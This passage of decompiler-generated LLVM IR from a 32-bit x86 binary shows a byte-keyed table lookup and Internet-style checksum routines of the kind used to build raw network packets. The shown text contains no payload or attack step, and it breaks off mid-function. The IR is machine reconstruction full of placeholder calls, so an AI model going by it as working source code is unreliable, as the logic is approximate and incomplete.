  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 10, 6, 7, 11, 12, 13, 14, 15, 17, 16, 58, 18, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 19, 20, 21, 22, 23, 24, 45, 46, 47, 48, 51, 52, 53, 55, 56, 57, 59, 60, 62, 63, 65, 66, 67, 68, 69, 70, 71, 73, 72, 49, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 88, 89, 87, 54, 50, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 224, 225, 226, 227, 125, 126, 127, 128, 129, 139, 130, 131, 132, 133, 134, 135, 136, 137, 138, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 212, 214, 213, 208, 209, 210, 211, 215, 216, 217, 218, 219, 220, 221, 222, 223, 242, 243, 244, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 275, 276, 245, 246, 247, 248, 249, 250, 259, 260, 251, 252, 253, 254, 255, 256, 257, 258, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 288, 289, 277, 278, 279, 280, 283, 284, 281, 282, 64, 61, 285, 286, 287, 297, 290, 291, 292, 293, 294, 295, 296, 298, 299, 300 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 15, 16, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 5, 6, 3, 33, 7, 20, 21, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 22, 25, 24, 19, 26, 27, 28, 29, 30, 31, 32, 34, 39, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 97, 98, 99, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 173, 174, 175, 176, 177, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 84, 88, 85, 86, 87, 83, 89, 90, 91, 92, 93, 94, 95, 96, 149, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 161, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 162, 163, 164, 165, 166, 167, 168, 170, 169, 23, 171, 172 }
  uselistorder i32* %edi.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 17, 18, 7, 10, 11, 12, 13, 14, 15, 16, 19, 20, 21, 22, 8, 9, 23, 33, 24, 25, 26, 27, 28, 29, 35, 60, 61, 30, 31, 32, 34, 36, 37, 38, 39, 40, 41, 44, 45, 42, 43, 46, 47, 121, 48, 49, 50, 51, 52, 53, 55, 56, 54, 57, 58, 59, 109, 110, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 29, 30, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 20, 21, 22, 23, 24, 25, 436, 15, 16, 17, 18, 19, 26, 27, 28, 29, 30, 31, 32, 33, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 34, 35, 36, 37, 60, 61, 62, 63, 64, 65, 66, 68, 69, 70, 71, 72, 73, 74, 76, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 106, 105, 67, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 151, 152, 164, 165, 153, 154, 155, 156, 167, 157, 158, 159, 160, 161, 162, 163, 166, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 497, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 201, 200, 202, 203, 204, 205, 206, 207, 208, 495, 496, 498, 499, 500, 501, 502, 503, 508, 509, 504, 505, 506, 507, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 235, 236, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 237, 238, 239, 240, 242, 243, 241, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 263, 264, 268, 269, 265, 266, 267, 261, 262, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 408, 409, 413, 410, 411, 412, 414, 415, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 456, 457, 458, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 431, 432, 429, 430, 433, 434, 435, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 484, 451, 452, 453, 454, 455, 485, 486, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 478, 479, 476, 477, 78, 75, 480, 481, 482, 483, 487, 488, 489, 490, 491, 492, 493, 494 }
  uselistorder i32 147, { 0, 7, 8, 9, 1, 10, 11, 12, 2, 13, 26, 3, 14, 15, 16, 4, 17, 18, 19, 5, 20, 21, 22, 23, 24, 27, 6, 25 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 20740, { 1, 2, 3, 4, 0 }
  uselistorder i32 20612, { 1, 2, 0, 3 }
  uselistorder i32 10388, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 20900, { 4, 5, 6, 7, 8, 0, 3, 2, 9, 10, 11, 12, 1, 13, 14, 15, 16 }
  uselistorder i32 20916, { 2, 0, 15, 3, 4, 10, 8, 14, 13, 1, 16, 7, 17, 11, 5, 12, 6, 9, 18, 19, 20, 21 }
  uselistorder i8 47, { 0, 1, 3, 4, 2, 5, 7, 6 }
  uselistorder i32 3140, { 1, 2, 3, 4, 0 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_8054b14.5 to i32), { 1, 0 }
  uselistorder i32 134564534, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_8049f6a, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8049ec7, { 1, 0 }
  uselistorder label %dec_label_pc_8049e86, { 1, 0 }
  uselistorder label %dec_label_pc_8049d1e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049ce8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049bbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049b86, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8049b6c, { 1, 0 }
  uselistorder label %dec_label_pc_8049b32, { 1, 0 }
  uselistorder label %dec_label_pc_8049a49, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049a11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80499f3, { 1, 0 }
  uselistorder label %dec_label_pc_80499d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80499c3, { 1, 0 }
  uselistorder label %dec_label_pc_804994e, { 1, 0 }
  uselistorder label %dec_label_pc_8049928, { 1, 0 }
  uselistorder label %dec_label_pc_80498ea, { 1, 0 }
  uselistorder label %dec_label_pc_80497f9, { 1, 0 }
  uselistorder label %dec_label_pc_804974f, { 1, 0 }
  uselistorder label %dec_label_pc_80496c3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80495d1, { 1, 0 }
  uselistorder label %dec_label_pc_804958e, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8049562, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049550, { 1, 0 }
  uselistorder label %dec_label_pc_80494dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804949f, { 0, 1, 5, 2, 3, 4 }
  uselistorder label %dec_label_pc_8049468, { 1, 0 }
  uselistorder label %dec_label_pc_804930a, { 1, 0 }
  uselistorder label %dec_label_pc_8049301, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80492e4, { 1, 0 }
  uselistorder label %dec_label_pc_80492b2, { 1, 0 }
  uselistorder label %dec_label_pc_8049289, { 1, 0 }
  uselistorder label %dec_label_pc_804924d, { 1, 0 }
  uselistorder label %dec_label_pc_80491db, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80491b6, { 1, 0 }
  uselistorder label %dec_label_pc_8049124, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80490e1, { 1, 0 }
  uselistorder label %dec_label_pc_8049044, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049001, { 1, 0 }
  uselistorder label %dec_label_pc_8048f64, { 1, 0 }
  uselistorder label %dec_label_pc_8048f33, { 1, 0 }
  uselistorder label %dec_label_pc_8048ee1, { 1, 0 }
  uselistorder label %dec_label_pc_8048e4a, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048db9, { 1, 0 }
  uselistorder label %dec_label_pc_8048d91, { 7, 8, 2, 1, 9, 3, 10, 11, 12, 15, 0, 13, 14, 6, 4, 5 }
  uselistorder label %dec_label_pc_8048d58, { 1, 0 }
  uselistorder label %dec_label_pc_8048c28, { 1, 0 }
  uselistorder label %dec_label_pc_8048c10, { 1, 0 }
  uselistorder label %dec_label_pc_8048bb4, { 1, 0 }
  uselistorder label %dec_label_pc_8048ad8, { 1, 0 }
  uselistorder label %dec_label_pc_8048700, { 1, 0 }
  uselistorder label %dec_label_pc_8048601, { 1, 0 }
  uselistorder label %dec_label_pc_80485be, { 1, 0 }
  uselistorder label %dec_label_pc_8048582, { 0, 1, 2, 3, 4, 7, 6, 5, 8 }
  uselistorder label %dec_label_pc_804855f, { 1, 0 }
  uselistorder label %dec_label_pc_80484e5, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_80484e5.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804848a, { 1, 0 }
  uselistorder label %bb139, { 1, 0 }
  uselistorder label %dec_label_pc_804841e, { 1, 0 }
  uselistorder label %dec_label_pc_80482cc, { 1, 0 }
  uselistorder label %dec_label_pc_80482b8, { 1, 0 }
  uselistorder label %dec_label_pc_804825d, { 1, 2, 0, 3, 4 }
}

define i32 @function_804a0a0(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a0a0:
  %tmp = trunc i32 %arg3 to i8
  %v4_804a0a5 = urem i32 %arg3, 256
  %v4_804a0b1 = zext i8 %arg1 to i32
  %v2_804a0b5 = icmp eq i8 %arg1, 0
  br i1 %v2_804a0b5, label %dec_label_pc_804a0e3, label %dec_label_pc_804a0c0

dec_label_pc_804a0c0:                             ; preds = %dec_label_pc_804a0a0
  %v3_804a0c4 = add i32 %arg2, 4
  %v4_804a0c4 = inttoptr i32 %v3_804a0c4 to i8*
  %v5_804a0c4 = load i8, i8* %v4_804a0c4, align 1
  %v16_804a0c4 = icmp eq i8 %tmp, %v5_804a0c4
  br i1 %v16_804a0c4, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0c9

dec_label_pc_804a0c9:                             ; preds = %dec_label_pc_804a0c0
  br label %dec_label_pc_804a0de

dec_label_pc_804a0d0:                             ; preds = %dec_label_pc_804a0de
  %v1_804a0d0 = add i32 %v0_804a0d3.in, 12
  %v2_804a0d0 = inttoptr i32 %v1_804a0d0 to i8*
  %v3_804a0d0 = load i8, i8* %v2_804a0d0, align 1
  %v4_804a0d0 = zext i8 %v3_804a0d0 to i32
  %v6_804a0d0 = and i32 %v5_804a0d0, -256
  %v7_804a0d0 = or i32 %v4_804a0d0, %v6_804a0d0
  %v16_804a0d8 = icmp eq i8 %v3_804a0d0, %tmp
  br i1 %v16_804a0d8, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0de

dec_label_pc_804a0de:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c9
  %v5_804a0d0 = phi i32 [ %v7_804a0d0, %dec_label_pc_804a0d0 ], [ %v4_804a0a5, %dec_label_pc_804a0c9 ]
  %v0_804a0d3.in = phi i32 [ %v0_804a0d3, %dec_label_pc_804a0d0 ], [ %arg2, %dec_label_pc_804a0c9 ]
  %v0_804a0de = phi i32 [ %v1_804a0de, %dec_label_pc_804a0d0 ], [ 0, %dec_label_pc_804a0c9 ]
  %v0_804a0d3 = add i32 %v0_804a0d3.in, 8
  %v1_804a0de = add i32 %v0_804a0de, 1
  store i32 %v1_804a0de, i32* @ecx, align 4
  %v12_804a0df = icmp eq i32 %v1_804a0de, %v4_804a0b1
  %v1_804a0e1 = icmp eq i1 %v12_804a0df, false
  br i1 %v1_804a0e1, label %dec_label_pc_804a0d0, label %dec_label_pc_804a0e3

dec_label_pc_804a0e3:                             ; preds = %dec_label_pc_804a0de, %dec_label_pc_804a0a0
  ret i32 %arg4

dec_label_pc_804a0eb:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c0
  %v0_804a0eb = phi i32 [ %arg2, %dec_label_pc_804a0c0 ], [ %v0_804a0d3, %dec_label_pc_804a0d0 ]
  %v1_804a0eb = inttoptr i32 %v0_804a0eb to i32*
  %v2_804a0eb = load i32, i32* %v1_804a0eb, align 4
  ret i32 %v2_804a0eb

; uselistorder directives
  uselistorder i32 %v1_804a0de, { 0, 2, 1 }
  uselistorder i32 %v0_804a0d3.in, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
}

define i32 @function_804a600(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a600:
  %v0_804a600 = load i32, i32* @edi, align 4
  %v0_804a601 = load i32, i32* @esi, align 4
  %v0_804a602 = load i32, i32* @ebx, align 4
  %v4_804a606 = zext i8 %arg1 to i32
  %v2_804a60e = icmp eq i8 %arg1, 0
  %v4_804a618 = urem i32 %arg3, 256
  %v5_804a618 = load i32, i32* @eax, align 4
  %v6_804a618 = and i32 %v5_804a618, -256
  %v7_804a618 = or i32 %v6_804a618, %v4_804a618
  br i1 %v2_804a60e, label %dec_label_pc_804a645, label %dec_label_pc_804a622

dec_label_pc_804a622:                             ; preds = %dec_label_pc_804a600
  %v1_804a622 = trunc i32 %arg3 to i8
  %v3_804a626 = add i32 %arg2, 4
  %v4_804a626 = inttoptr i32 %v3_804a626 to i8*
  %v5_804a626 = load i8, i8* %v4_804a626, align 1
  %v16_804a626 = icmp eq i8 %v1_804a622, %v5_804a626
  br i1 %v16_804a626, label %dec_label_pc_804a64c, label %dec_label_pc_804a62b

dec_label_pc_804a62b:                             ; preds = %dec_label_pc_804a622
  br label %dec_label_pc_804a640

dec_label_pc_804a632:                             ; preds = %dec_label_pc_804a640
  %v1_804a632 = add i32 %v0_804a635.in, 12
  %v2_804a632 = inttoptr i32 %v1_804a632 to i8*
  %v3_804a632 = load i8, i8* %v2_804a632, align 1
  %v4_804a632 = zext i8 %v3_804a632 to i32
  %v6_804a632 = and i32 %v5_804a632, -256
  %v7_804a632 = or i32 %v4_804a632, %v6_804a632
  %v16_804a63a = icmp eq i8 %v1_804a622, %v3_804a632
  br i1 %v16_804a63a, label %dec_label_pc_804a64c, label %dec_label_pc_804a640

dec_label_pc_804a640:                             ; preds = %dec_label_pc_804a632, %dec_label_pc_804a62b
  %v5_804a632 = phi i32 [ %v7_804a632, %dec_label_pc_804a632 ], [ %v7_804a618, %dec_label_pc_804a62b ]
  %v0_804a635.in = phi i32 [ %v0_804a635, %dec_label_pc_804a632 ], [ %arg2, %dec_label_pc_804a62b ]
  %v0_804a640 = phi i32 [ %v1_804a640, %dec_label_pc_804a632 ], [ 0, %dec_label_pc_804a62b ]
  %v0_804a635 = add i32 %v0_804a635.in, 8
  %v1_804a640 = add i32 %v0_804a640, 1
  store i32 %v1_804a640, i32* @ecx, align 4
  %v12_804a641 = icmp eq i32 %v4_804a606, %v1_804a640
  %v1_804a643 = icmp eq i1 %v12_804a641, false
  br i1 %v1_804a643, label %dec_label_pc_804a632, label %dec_label_pc_804a645

dec_label_pc_804a645:                             ; preds = %dec_label_pc_804a640, %dec_label_pc_804a64c, %dec_label_pc_804a600
  store i32 %v0_804a602, i32* @ebx, align 4
  store i32 %v0_804a601, i32* @esi, align 4
  store i32 %v0_804a600, i32* @edi, align 4
  ret i32 %arg4

dec_label_pc_804a64c:                             ; preds = %dec_label_pc_804a632, %dec_label_pc_804a622
  %v0_804a64c = phi i32 [ %arg2, %dec_label_pc_804a622 ], [ %v0_804a635, %dec_label_pc_804a632 ]
  %v1_804a64c = inttoptr i32 %v0_804a64c to i32*
  %v2_804a64c = load i32, i32* %v1_804a64c, align 4
  %sext = mul i32 %v2_804a64c, 16777216
  %v2_804a64e = icmp eq i32 %sext, 0
  br i1 %v2_804a64e, label %dec_label_pc_804a645, label %dec_label_pc_804a652

dec_label_pc_804a652:                             ; preds = %dec_label_pc_804a64c
  store i32 %v0_804a602, i32* @ebx, align 4
  store i32 %v0_804a601, i32* @esi, align 4
  store i32 %v0_804a600, i32* @edi, align 4
  %v2_804a662 = sdiv i32 %sext, 16777216
  %v3_804a662 = inttoptr i32 %v2_804a662 to i8*
  %v4_804a662 = call i32 @function_8051d50(i8* %v3_804a662, i32 10)
  ret i32 %v4_804a662

; uselistorder directives
  uselistorder i32 %v1_804a640, { 0, 2, 1 }
  uselistorder i32 %v0_804a635.in, { 1, 0 }
  uselistorder i32 %v0_804a602, { 1, 0 }
  uselistorder i32 %v0_804a601, { 1, 0 }
  uselistorder i32 %v0_804a600, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804a645, { 1, 0, 2 }
}

define i32 @function_804d4b0() local_unnamed_addr {
dec_label_pc_804d4b0:
  %tmp = call i16* @__decompiler_undefined_function_4()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v4_804d4b7 = ptrtoint i16* %tmp to i32
  %tmp14 = or i32 %tmp11, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804d4d5, label %dec_label_pc_804d4c0

dec_label_pc_804d4c0:                             ; preds = %dec_label_pc_804d4b0, %dec_label_pc_804d4c0
  %v0_804d4ce = phi i32 [ %v2_804d4ce, %dec_label_pc_804d4c0 ], [ 0, %dec_label_pc_804d4b0 ]
  %v0_804d4c3 = phi i32 [ %v1_804d4c3, %dec_label_pc_804d4c0 ], [ %tmp11, %dec_label_pc_804d4b0 ]
  %v0_804d4cb = phi i32 [ %v1_804d4cb, %dec_label_pc_804d4c0 ], [ %v4_804d4b7, %dec_label_pc_804d4b0 ]
  %v1_804d4c0 = inttoptr i32 %v0_804d4cb to i16*
  %v2_804d4c0 = load i16, i16* %v1_804d4c0, align 2
  %v3_804d4c0 = zext i16 %v2_804d4c0 to i32
  %v1_804d4c3 = add i32 %v0_804d4c3, -2
  %v1_804d4cb = add i32 %v0_804d4cb, 2
  %v2_804d4ce = add i32 %v3_804d4c0, %v0_804d4ce
  %v5_804d4d0 = icmp eq i32 %v1_804d4c3, 0
  %v9_804d4d0 = icmp eq i32 %v0_804d4c3, 3
  %v2_804d4d3 = or i1 %v9_804d4d0, %v5_804d4d0
  br i1 %v2_804d4d3, label %dec_label_pc_804d4d5.loopexit, label %dec_label_pc_804d4c0

dec_label_pc_804d4d5.loopexit:                    ; preds = %dec_label_pc_804d4c0
  br label %dec_label_pc_804d4d5

dec_label_pc_804d4d5:                             ; preds = %dec_label_pc_804d4d5.loopexit, %dec_label_pc_804d4b0
  %v0_804d4db = phi i32 [ %v2_804d4ce, %dec_label_pc_804d4d5.loopexit ], [ 0, %dec_label_pc_804d4b0 ]
  %v0_804d4d8 = phi i32 [ %v1_804d4cb, %dec_label_pc_804d4d5.loopexit ], [ %v4_804d4b7, %dec_label_pc_804d4b0 ]
  %v0_804d4d5 = phi i32 [ %v1_804d4c3, %dec_label_pc_804d4d5.loopexit ], [ %tmp11, %dec_label_pc_804d4b0 ]
  %v8_804d4d5 = icmp eq i32 %v0_804d4d5, 1
  %v1_804d4d6 = icmp eq i1 %v8_804d4d5, false
  br i1 %v1_804d4d6, label %dec_label_pc_804d4dd, label %dec_label_pc_804d4d8

dec_label_pc_804d4d8:                             ; preds = %dec_label_pc_804d4d5
  %v1_804d4d8 = inttoptr i32 %v0_804d4d8 to i8*
  %v2_804d4d8 = load i8, i8* %v1_804d4d8, align 1
  %v3_804d4d8 = sext i8 %v2_804d4d8 to i32
  %v2_804d4db = add i32 %v3_804d4d8, %v0_804d4db
  br label %dec_label_pc_804d4dd

dec_label_pc_804d4dd:                             ; preds = %dec_label_pc_804d4d5, %dec_label_pc_804d4d8
  %v0_804d4dd = phi i32 [ %v0_804d4db, %dec_label_pc_804d4d5 ], [ %v2_804d4db, %dec_label_pc_804d4d8 ]
  %v1_804d4df = urem i32 %v0_804d4dd, 65536
  %v2_804d4e2 = udiv i32 %v0_804d4dd, 65536
  %v2_804d4e6 = add nuw nsw i32 %v1_804d4df, %v2_804d4e2
  %v2_804d4ea = udiv i32 %v2_804d4e6, 65536
  %v2_804d4ed = add nuw nsw i32 %v2_804d4ea, %v2_804d4e6
  %v1_804d4ef = urem i32 %v2_804d4ed, 65536
  %v1_804d4f2 = xor i32 %v1_804d4ef, 65535
  ret i32 %v1_804d4f2

; uselistorder directives
  uselistorder i32 %v2_804d4e6, { 1, 0 }
  uselistorder i32 %v0_804d4db, { 1, 0 }
  uselistorder i32 %v1_804d4c3, { 0, 2, 1 }
  uselistorder i32 %v4_804d4b7, { 1, 0 }
  uselistorder i32 %tmp11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d4dd, { 1, 0 }
  uselistorder label %dec_label_pc_804d4c0, { 1, 0 }
}

define i32 @function_804d500() local_unnamed_addr {
dec_label_pc_804d500:
  %tmp14 = call i16* @__decompiler_undefined_function_4()
  %tmp15 = call i16 @__decompiler_undefined_function_1()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %v4_804d515 = ptrtoint i16* %tmp14 to i32
  %v1_804d51e = add i32 %tmp17, 12
  %v2_804d51e = inttoptr i32 %v1_804d51e to i32*
  %v3_804d51e = load i32, i32* %v2_804d51e, align 4
  %v1_804d521 = add i32 %tmp17, 16
  %v2_804d521 = inttoptr i32 %v1_804d521 to i32*
  %v3_804d521 = load i32, i32* %v2_804d521, align 4
  %v7_804d527 = icmp sgt i32 %tmp16, 1
  br i1 %v7_804d527, label %dec_label_pc_804d530, label %dec_label_pc_804d545

dec_label_pc_804d530:                             ; preds = %dec_label_pc_804d500, %dec_label_pc_804d530
  %v0_804d53e = phi i32 [ %v2_804d53e, %dec_label_pc_804d530 ], [ 0, %dec_label_pc_804d500 ]
  %v0_804d533 = phi i32 [ %v1_804d533, %dec_label_pc_804d530 ], [ %tmp16, %dec_label_pc_804d500 ]
  %v0_804d53b = phi i32 [ %v1_804d53b, %dec_label_pc_804d530 ], [ %v4_804d515, %dec_label_pc_804d500 ]
  %v1_804d530 = inttoptr i32 %v0_804d53b to i16*
  %v2_804d530 = load i16, i16* %v1_804d530, align 2
  %v3_804d530 = zext i16 %v2_804d530 to i32
  %v1_804d533 = add i32 %v0_804d533, -2
  %v1_804d53b = add i32 %v0_804d53b, 2
  %v2_804d53e = add i32 %v3_804d530, %v0_804d53e
  %v1_804d540 = add i32 %v0_804d533, -3
  %v6_804d540 = sub i32 2, %v0_804d533
  %v7_804d540 = and i32 %v1_804d533, %v6_804d540
  %v8_804d540 = icmp slt i32 %v7_804d540, 0
  %v9_804d540 = icmp eq i32 %v1_804d540, 0
  %v10_804d540 = icmp slt i32 %v1_804d540, 0
  %v3_804d543 = icmp eq i1 %v10_804d540, %v8_804d540
  %v4_804d543 = icmp eq i1 %v9_804d540, false
  %v5_804d543 = and i1 %v4_804d543, %v3_804d543
  br i1 %v5_804d543, label %dec_label_pc_804d530, label %dec_label_pc_804d545.loopexit

dec_label_pc_804d545.loopexit:                    ; preds = %dec_label_pc_804d530
  br label %dec_label_pc_804d545

dec_label_pc_804d545:                             ; preds = %dec_label_pc_804d545.loopexit, %dec_label_pc_804d500
  %v0_804d5b0 = phi i32 [ %v2_804d53e, %dec_label_pc_804d545.loopexit ], [ 0, %dec_label_pc_804d500 ]
  %v0_804d5ae = phi i32 [ %v1_804d53b, %dec_label_pc_804d545.loopexit ], [ %v4_804d515, %dec_label_pc_804d500 ]
  %v0_804d545 = phi i32 [ %v1_804d533, %dec_label_pc_804d545.loopexit ], [ %tmp16, %dec_label_pc_804d500 ]
  %v8_804d545 = icmp eq i32 %v0_804d545, 1
  br i1 %v8_804d545, label %dec_label_pc_804d5ac, label %dec_label_pc_804d548

dec_label_pc_804d548:                             ; preds = %dec_label_pc_804d545, %dec_label_pc_804d5ac
  %v0_804d556 = phi i32 [ %v0_804d5b0, %dec_label_pc_804d545 ], [ %v2_804d5b0, %dec_label_pc_804d5ac ]
  %v2_804d54c = udiv i32 %v3_804d521, 65536
  %v1_804d54f = add i32 %tmp17, 9
  %v2_804d54f = inttoptr i32 %v1_804d54f to i8*
  %v3_804d54f = load i8, i8* %v2_804d54f, align 1
  %v1_804d552 = zext i8 %v3_804d54f to i16
  %v2_804d552 = call i16 @llvm.bswap.i16(i16 %v1_804d552)
  %v3_804d552 = zext i16 %v2_804d552 to i32
  %v2_804d556 = add i32 %v0_804d556, %v2_804d54c
  %v2_804d55e = add i32 %v2_804d556, %v3_804d552
  %v1_804d564 = urem i32 %v3_804d51e, 65536
  %v2_804d56a = udiv i32 %v3_804d51e, 65536
  %v1_804d571 = urem i32 %v3_804d521, 65536
  %v4_804d579 = zext i16 %tmp15 to i32
  %v2_804d56d = add nuw nsw i32 %v2_804d56a, %v4_804d579
  %v2_804d577 = add nuw nsw i32 %v2_804d56d, %v1_804d564
  %v2_804d584 = add nuw nsw i32 %v2_804d577, %v1_804d571
  %v2_804d586 = add i32 %v2_804d584, %v2_804d55e
  %tmp = icmp ult i32 %v2_804d586, 65536
  br i1 %tmp, label %dec_label_pc_804d59e, label %dec_label_pc_804d590

dec_label_pc_804d590:                             ; preds = %dec_label_pc_804d548, %dec_label_pc_804d590
  %v2_804d5953 = phi i32 [ %v2_804d595, %dec_label_pc_804d590 ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v2_804d5994.in = phi i32 [ %v2_804d595, %dec_label_pc_804d590 ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v2_804d5994 = udiv i32 %v2_804d5994.in, 65536
  %v1_804d590 = urem i32 %v2_804d5953, 65536
  %v2_804d595 = add nuw nsw i32 %v1_804d590, %v2_804d5994
  %tmp25 = icmp ult i32 %v2_804d595, 65536
  %v1_804d59c = icmp eq i1 %tmp25, false
  br i1 %v1_804d59c, label %dec_label_pc_804d590, label %dec_label_pc_804d59e.loopexit

dec_label_pc_804d59e.loopexit:                    ; preds = %dec_label_pc_804d590
  br label %dec_label_pc_804d59e

dec_label_pc_804d59e:                             ; preds = %dec_label_pc_804d59e.loopexit, %dec_label_pc_804d548
